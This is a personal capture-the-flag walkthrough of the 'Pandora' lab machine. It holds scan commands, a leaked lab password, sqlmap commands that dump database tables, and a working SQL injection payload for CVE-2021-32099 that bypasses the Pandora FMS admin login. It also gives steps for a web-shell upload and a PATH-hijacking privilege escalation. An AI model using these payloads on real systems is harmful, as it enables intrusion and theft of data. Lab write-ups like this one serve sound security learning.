#Pandora

1. Enumeration
    1. First we can use rustscan which scans all tcp ports (65535) in less time than nmap
        1. rustscan -a 10.10.11.136 -r 1-65535
            1. only found two ports open: 22 for ssh & 80 for http
                
                ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled.png)
                
    2. We ran nmap on both ports
        
        ```jsx
        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
        |   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
        |_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
        80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
        |_http-title: Play | Landing
        | http-methods: 
        |_  Supported Methods: HEAD GET POST OPTIONS
        |_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
        |_http-server-header: Apache/2.4.41 (Ubuntu)
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
        ```
        
    3. After a lot of enumeration on both ports, we find nothing interesting, So we thing about finding more ports (UDP)
    4. You could use nmap top 1000 udp ports, but It takes a lot of time >> anyway it found port 161 is open
        
        ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%201.png)
        
    5. For getting a faster way, I searched for most common UDP open ports and found this article [https://www.speedguide.net/ports_common.php](https://www.speedguide.net/ports_common.php)
    6. I copied the udp ports and used sed and awk to make a suitable list of ports for nmap
        
        ```jsx
        161,123,53,500,111,137,69,5353,12203,9987,9300,1029,27960,64738,28960,13777,27910,7159,34297,23000,13,19,9905,27003,8888,3784,1984,10024,44570,2049,14550,9916,1026,20100,9303,7777,61042,61030,50437,50200,61340,61411,213,63961,63544,5351,520,5802,5052,9400,
        ```
        
    7. and found one open which is 161 for snmp
        
        ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%202.png)
        
2. Exploiting SNMP
    1. I followed Hacktricks cheat sheet for snmp ports 161,162 pentesting: 
        1. [ttps://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
        2. Just ran nmap and snmpwalk:
            1. sudo nmap -sU -p161 —script snmp-* 10.10.11.136
                1. after founding public community string “public”, I used snmpwalk for easier enum
        3. snmpwalk -v 1 -c public 10.10.11.136 | tee snmpwalk.txt
            1. I found those strings from snmpwalk
                
                ```jsx
                iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
                iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
                iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
                ```
                
            2. I also found daniel password in snmpwalk dumped processes
                
                ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%203.png)
                
            3. Nmap also would have found it:
                1. sudo nmap -sU -p161 --script snmp-* 10.10.11.136 -oN nmap-snmp.txt
                    
                    ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%204.png)
                    
            4. I tried to login with these credentials with SSH and It succeded
                
                ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%205.png)
                
3. Lateral movement:
    1. After running Linpeas and reading through the results, I found there is a lot of website files and folders, but I can’t access them directly from My machine. I thought about port redirecting using SSH, but I had no idea which port is running these websites.
    2. Here comes the idea of using ssh dynamic tunnel. If you don’t know what is ssh dynamic tunnel, you can learn about it from here: [https://www.youtube.com/watch?v=E-_TRQ7bQos](https://www.youtube.com/watch?v=E-_TRQ7bQos)
        1. Here is a simple config:
            1. ssh -D 1234 daniel@10.10.11.136      #this will login to ssh and open tunnel at port 1234 on our machine that redirects any traffic going through that port into pandora machine
                1. enter the password in the open prompt: HotelBabylon23
            2. add a new proxy in Foxy Proxy with these configs 
                1. use SOCKS5 in the proxy type
                    
                    ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%206.png)
                    
            3. And to access it from terminal 
                1. add a line in the end of file /etc/proxychains.conf and comment socks4 first
                    
                    ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%207.png)
                    
        2. This is the website 
            
            ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%208.png)
            
        3. this is its version
            1. `v7.0NG.742_FIX_PERL2020`
            2. I found some exploits about pandora 742 like sql injection
        4. And after configuring the proxychain now I can use sqlmap like this:
            1. proxychains sqlmap  [http://localhost/pandora_console/include/chart_generator.php?session_id=a](http://localhost/pandora_console/include/chart_generator.php?session_id=a%27) -p session_id —dbs 
                
                ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%209.png)
                
            2. proxychains sqlmap [http://localhost/pandora_console/include/chart_generator.php?session_id=a](http://localhost/pandora_console/include/chart_generator.php?session_id=a) -p session_id -D pandora --tables
                1. this is an interesting table
                    
                    ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%2010.png)
                    
            3. proxychains sqlmap [http://localhost/pandora_console/include/chart_generator.php?session_id=a](http://localhost/pandora_console/include/chart_generator.php?session_id=a) -p session_id -D pandora -T tpassword_history --dump
                
                ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%2011.png)
                
        5. Cracking this password with john
            
            ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%2012.png)
            
        6. this password didn’t helped much so, I moved into another table “tsession_php”
            
            ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%2013.png)
            
            g4e01qdgk36mfdh90hvcc54umq
            
        7. and copied the session and pasted it in the session cookie >> I got dashboard as user matt
            
            ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%2014.png)
            
    3. Reverse shell as Matt:
        1. But it needed password, so going to the matt profile I could change the password like this
            
            ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%2015.png)
            
    4. But after all this work, I found that matt doesn’t has all the capabilities in the dashboard, So I tried to get admin dashboard
    5. After a lot of search I found this one:
        1. And this is the poc: https://github.com/ibnuuby/CVE-2021-32099 
        2. or [https://sploitus.com/exploit?id=64F47C34-B920-525E-80F3-B416C84DA936&utm_source=rss&utm_medium=rss](https://sploitus.com/exploit?id=64F47C34-B920-525E-80F3-B416C84DA936&utm_source=rss&utm_medium=rss)
        3. here is the payload:
            1. http://localhost`/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20endof%20%20--%20endof`
        4. This exploit made us change login with the admin account without knowing the password, so now we’re logged in and the website changed the cookie for the admin account
        5. g4e01qdgk36mfdh90hvcc54umq >> this is the admin current session
    6. Going to the home page of the pandora console we find that we are admin, now we try to find a way to get RCE
    7. Then I found a PHP file upload vulnerability to RCE
        1. [https://www.youtube.com/watch?v=qmk80IP5G0k](https://www.youtube.com/watch?v=qmk80IP5G0k)
    8. Go to Admin Tools > File Manager >>> upload  you shell
        
        ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%2016.png)
        
        ![Screenshot_2022-05-21_10-08-07.png](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Screenshot_2022-05-21_10-08-07.png)
        
    9. get a shell as matt
        
        ![Screenshot_2022-05-21_10-49-14.png](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Screenshot_2022-05-21_10-49-14.png)
        
    10. And got the user flag
        
        ![Screenshot_2022-05-21_10-50-04.png](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Screenshot_2022-05-21_10-50-04.png)
        
4. Privilege escalatino
    1. I generated ssh keys and used it to get a better shell
        1. ssh-keygen           #to generate new key
        2. and pasted the public key in /home/matt/.ssh
            
            ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%2017.png)
            
        3. Running linpeas again I found file > /usr/bin/pandora_backup
        4. getting that file to my machine and using strings on it, I found it is using tar command without specifying the PATH. This is a PATH Hijacking vulnerability.
        5. I made a new tar file, gave it execute permissions and edited my path so that it points to the directory where my tar file first
        
        ![Untitled](Pandora%2087860ef0ec0a4bc28cf84cd4bf403711/Untitled%2018.png)
        
5. Notes:
    1. editting path vairable to privesc won’t work without a proper sherll
    2. putting you public key in authorized_keys >> just copy the whole key even with kali@kali
